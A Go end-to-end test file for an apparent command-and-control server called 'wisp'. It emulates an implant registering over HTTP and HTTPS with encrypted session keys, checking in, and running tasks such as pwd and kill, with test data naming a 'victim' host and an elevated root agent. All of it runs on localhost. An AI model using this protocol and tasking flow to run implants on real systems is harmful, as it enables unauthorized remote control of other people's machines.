package server

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/user/wisp/internal/db"
	"github.com/user/wisp/shared/protocol"
)

func freePort(t *testing.T) int {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("free port: %v", err)
	}
	port := ln.Addr().(*net.TCPAddr).Port
	ln.Close()
	return port
}

func startHTTPListenerForTest(t *testing.T, srv *Server, proto string, port int) {
	t.Helper()
	row, err := srv.db.CreateListener("e2e-"+proto, proto, "127.0.0.1", port, proto == "https", "")
	if err != nil {
		t.Fatalf("create listener: %v", err)
	}
	if err := srv.StartListener(row.ID); err != nil {
		t.Fatalf("start %s listener: %v", proto, err)
	}
	t.Cleanup(func() { _ = srv.StopListener(row.ID) })
}

// insecureClient mirrors the real agent transport, which pins or skips the
// self-signed TLS certificate.
func insecureClient() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
}

// emulateAgent speaks the HTTP wire protocol exactly like the real agent
// transport: fetch key -> RSA-wrapped session keys -> AES-encrypted registration.
func emulateAgent(t *testing.T, base string, regData map[string]any) (*protocol.SessionKeys, string) {
	t.Helper()
	client := insecureClient()

	// Fetch the RSA public key (bootstrap path used by key-less CLI agents).
	resp, err := client.Get(base + "/api/v1/pubkey")
	if err != nil {
		t.Fatalf("fetch pubkey: %v", err)
	}
	var pk struct {
		PubKey string `json:"pubkey"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&pk); err != nil {
		t.Fatalf("decode pubkey: %v", err)
	}
	resp.Body.Close()
	if pk.PubKey == "" {
		t.Fatal("empty pubkey")
	}

	keys, err := protocol.GenerateSessionKeys()
	if err != nil {
		t.Fatalf("session keys: %v", err)
	}
	keyMaterial := append(keys.AESKey, keys.HMACKey...)
	encKeys, err := protocol.RSAEncrypt([]byte(pk.PubKey), keyMaterial)
	if err != nil {
		t.Fatalf("rsa encrypt: %v", err)
	}
	regJSON, _ := json.Marshal(regData)
	encReg, err := keys.Encrypt(regJSON)
	if err != nil {
		t.Fatalf("encrypt reg: %v", err)
	}

	payload := make([]byte, 4+len(encKeys)+len(encReg))
	binary.LittleEndian.PutUint32(payload[0:4], uint32(len(encKeys)))
	copy(payload[4:], encKeys)
	copy(payload[4+len(encKeys):], encReg)

	body, _ := json.Marshal(map[string]string{"payload": base64.StdEncoding.EncodeToString(payload)})
	regResp, err := client.Post(base+"/api/v1/register", "application/json", bytes.NewReader(body))
	if err != nil {
		t.Fatalf("register post: %v", err)
	}
	defer regResp.Body.Close()
	if regResp.StatusCode != http.StatusOK {
		t.Fatalf("register status = %d", regResp.StatusCode)
	}
	var regOut struct {
		Status string `json:"status"`
		Ack    string `json:"ack"`
	}
	if err := json.NewDecoder(regResp.Body).Decode(&regOut); err != nil {
		t.Fatalf("decode reg response: %v", err)
	}
	if regOut.Status != "ok" {
		t.Fatal("registration rejected")
	}
	ack, _ := base64.StdEncoding.DecodeString(regOut.Ack)
	if _, err := keys.Decrypt(ack); err != nil {
		t.Fatalf("ack decrypt: %v", err)
	}
	return keys, regData["id"].(string)
}

func emulateCheckin(t *testing.T, base, agentID string, seq uint64, keys *protocol.SessionKeys, data []byte) []byte {
	t.Helper()
	client := insecureClient()
	req := map[string]any{"id": agentID, "seq": seq}
	if len(data) > 0 {
		enc, err := keys.Encrypt(data)
		if err != nil {
			t.Fatalf("encrypt checkin data: %v", err)
		}
		req["data"] = base64.StdEncoding.EncodeToString(enc)
	}
	body, _ := json.Marshal(req)
	resp, err := client.Post(base+"/api/v1/checkin", "application/json", bytes.NewReader(body))
	if err != nil {
		t.Fatalf("checkin post: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("checkin status = %d", resp.StatusCode)
	}
	var cr struct {
		Tasks string `json:"tasks"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&cr); err != nil {
		t.Fatalf("decode checkin response: %v", err)
	}
	tasks, _ := base64.StdEncoding.DecodeString(cr.Tasks)
	plain, err := keys.Decrypt(tasks)
	if err != nil {
		t.Fatalf("decrypt tasks: %v", err)
	}
	return plain
}

// TestKillMarksSessionDead verifies that when an agent reports a completed
// CmdClientKill, the session is marked dead immediately (no health-check wait).
func TestKillMarksSessionDead(t *testing.T) {
	srv := newTestServer(t)
	port := freePort(t)
	startHTTPListenerForTest(t, srv, "http", port)
	base := fmt.Sprintf("http://127.0.0.1:%d", port)

	id := "bbbbbbbbbbbbbbbb"
	keys, _ := emulateAgent(t, base, map[string]any{
		"id": id, "hostname": "victim", "username": "root", "domain": "",
		"internal_ip": "127.0.0.1", "os": "linux amd64", "arch": "amd64",
		"pid": 42, "process_name": "/tmp/agent", "is_elevated": true,
		"sleep": 5000, "jitter": 0,
	})

	if srv.GetSession(id).Info.Status != protocol.StatusAlive {
		t.Fatal("session should be alive after register")
	}

	// Agent picks up a kill task and reports it completed.
	task, err := srv.db.CreateTask(id, int(protocol.CmdClientKill), "{}")
	if err != nil {
		t.Fatalf("create kill task: %v", err)
	}
	resJSON, _ := json.Marshal([]map[string]any{{"task_id": task.ID, "output": "agent terminated", "status": "completed"}})
	emulateCheckin(t, base, id, 1, keys, resJSON)

	// The session must be dead immediately, without waiting 30s+.
	row, err := srv.db.GetSession(id)
	if err != nil {
		t.Fatalf("get session: %v", err)
	}
	if row.Status != protocol.StatusDead {
		t.Fatalf("session status = %q, want dead immediately", row.Status)
	}
	if as := srv.GetSession(id); as == nil || as.Info.Status != protocol.StatusDead {
		t.Fatal("in-memory session not marked dead")
	}
}

// TestHTTPAgentOnline verifies both HTTP and HTTPS listeners serve the full
// register -> ack -> checkin -> task delivery -> result completion cycle.
func TestHTTPAgentOnline(t *testing.T) {
	for _, proto := range []string{"http", "https"} {
		t.Run(proto, func(t *testing.T) {
			srv := newTestServer(t)
			port := freePort(t)
			startHTTPListenerForTest(t, srv, proto, port)
			base := fmt.Sprintf("%s://127.0.0.1:%d", proto, port)

			id := "aaaaaaaaaaaaaaaa"
			keys, _ := emulateAgent(t, base, map[string]any{
				"id":           id,
				"hostname":     "test-agent",
				"username":     "root",
				"domain":       "",
				"internal_ip":  "127.0.0.1",
				"os":           "linux amd64",
				"arch":         "amd64",
				"pid":          1234,
				"process_name": "/tmp/agent",
				"is_elevated":  true,
				"sleep":        1000,
				"jitter":       0,
			})

			as := srv.GetSession(id)
			if as == nil {
				t.Fatal("session did not register")
			}
			if as.Info.Status != protocol.StatusAlive {
				t.Fatalf("status = %q, want alive", as.Info.Status)
			}

			if got := emulateCheckin(t, base, id, 1, keys, nil); string(got) != "[]" {
				t.Fatalf("first checkin tasks = %q, want []", got)
			}

			// A pending task must round-trip to the agent.
			task, err := srv.db.CreateTask(id, int(protocol.CmdPwd), "{}")
			if err != nil {
				t.Fatalf("create task: %v", err)
			}
			if got := emulateCheckin(t, base, id, 2, keys, nil); !strings.Contains(string(got), `"command_id":26`) {
				t.Fatalf("expected pwd task in checkin, got %s", got)
			}

			// Reporting a result must complete the task.
			resJSON, _ := json.Marshal([]map[string]any{{"task_id": task.ID, "output": "online-ok", "status": "completed"}})
			emulateCheckin(t, base, id, 3, keys, resJSON)
			done, err := srv.db.GetTask(task.ID)
			if err != nil {
				t.Fatalf("get task: %v", err)
			}
			if done.Status != protocol.TaskCompleted || done.Result != "online-ok" {
				t.Fatalf("task not completed: status=%q result=%q", done.Status, done.Result)
			}
		})
	}
}

// TestHTTPRealAgentOnline runs the actual agent binary against the HTTP and
// HTTPS listeners and verifies it registers, checks in and completes a task —
// the real "上线" flow.
func TestHTTPRealAgentOnline(t *testing.T) {
	for _, proto := range []string{"http", "https"} {
		t.Run(proto, func(t *testing.T) {
			srv := newTestServer(t)
			port := freePort(t)
			startHTTPListenerForTest(t, srv, proto, port)

			// Windows: os/exec refuses to launch a file without a .exe suffix
			// (no execute permission bits on NTFS), so name the artifact .exe.
			agentBin := filepath.Join(t.TempDir(), "agent-e2e")
			if runtime.GOOS == "windows" {
				agentBin += ".exe"
			}
			build := exec.Command("go", "build", "-o", agentBin, ".")
			build.Dir = filepath.Join("..", "..", "agent")
			if out, err := build.CombinedOutput(); err != nil {
				t.Fatalf("build agent: %v\n%s", err, out)
			}

			ctx, cancel := context.WithCancel(context.Background())
			defer cancel()
			args := []string{"-server", "127.0.0.1", "-port", fmt.Sprint(port), "-sleep", "500", "-jitter", "0"}
			if proto == "https" {
				// GUI payloads pin the server certificate fingerprint. Pass it
				// explicitly so this test covers the real fingerprint-pinned
				// path (a missing or stale pin is the classic silent no-online
				// cause for HTTPS).
				args = append(args, "-transport", "https", "-tls", "-fingerprint", srv.TLSFingerprint())
			} else {
				args = append(args, "-transport", "http")
			}
			agentCmd := exec.CommandContext(ctx, agentBin, args...)
			agentCmd.Stderr = &bytes.Buffer{}
			if err := agentCmd.Start(); err != nil {
				t.Fatalf("start agent: %v", err)
			}
			defer agentCmd.Process.Kill()

			// Wait for the agent to appear in the DB.
			deadline := time.Now().Add(15 * time.Second)
			var session *db.SessionRow
			for time.Now().Before(deadline) {
				rows, _ := srv.db.ListSessions("")
				if len(rows) > 0 {
					session = &rows[0]
					break
				}
				time.Sleep(250 * time.Millisecond)
			}
			if session == nil {
				t.Fatalf("[%s] agent never registered (stderr: %s)", proto, agentCmd.Stderr.(*bytes.Buffer).String())
			}
			if session.Status != protocol.StatusAlive {
				t.Fatalf("[%s] status = %q, want alive", proto, session.Status)
			}
			if session.Hostname == "" {
				t.Fatalf("[%s] hostname missing", proto)
			}

			// Send a real task and wait for completion from the live agent.
			task, err := srv.db.CreateTask(session.ID, int(protocol.CmdPwd), "{}")
			if err != nil {
				t.Fatalf("create task: %v", err)
			}
			doneDeadline := time.Now().Add(15 * time.Second)
			var done *db.TaskRow
			for time.Now().Before(doneDeadline) {
				row, err := srv.db.GetTask(task.ID)
				if err == nil && row.Status != protocol.TaskPending && row.Status != protocol.TaskSent {
					done = row
					break
				}
				time.Sleep(250 * time.Millisecond)
			}
			if done == nil {
				t.Fatalf("[%s] pwd task never completed", proto)
			}
			if done.Status != protocol.TaskCompleted || done.Result == "" {
				t.Fatalf("[%s] task result status=%q result=%q", proto, done.Status, done.Result)
			}
		})
	}
}
